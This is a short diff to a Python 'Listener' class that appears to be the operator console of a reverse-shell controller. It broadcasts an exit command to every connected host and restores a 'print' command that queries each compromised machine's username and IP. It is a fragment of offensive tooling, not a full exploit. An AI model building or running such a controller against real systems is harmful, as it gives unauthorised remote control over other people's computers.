@@ -46,9 +46,8 @@ class Listener:
 	def reliable_send(self, data):
 		json_data = json.dumps(data)
 		if data == "exit":
-			if self.connections:
-				for con in self.connections:
-					con[0].send(json_data.encode())
+			for con in self.connections:
+				con[0].send(json_data.encode())
 		elif self.chosen_connection:
 			self.chosen_connection[0].send(json_data.encode())
 		else:
@@ -107,17 +106,17 @@ class Listener:
 				command = input(f"{user} # ")
 			else: command = input(">>> ")
 
-			# if command == "print":
-			# 	connections = self.get_connections()
-			# 	if connections:
-			# 		for con in self.get_connections():
-			# 			self.chosen_connection = con
-			# 			print("(" + con[1][0] + ") " + self.execute_remotely("get username"))
-			# 		self.chosen_connection = None
-			# 	else:
-			# 		print(colored("[-] You don't have any connection yet", "red"))
+			if command == "print":
+				connections = self.get_connections()
+				if connections:
+					for con in self.get_connections():
+						self.chosen_connection = con
+						print("(" + con[1][0] + ") " + self.execute_remotely("get username"))
+					self.chosen_connection = None
+				else:
+					print(colored("[-] You don't have any connection yet", "red"))
 
-			if command == "choose":
+			elif command == "choose":
 				connections = self.get_connections()
 				if connections:
 					for con in range(len(connections)):
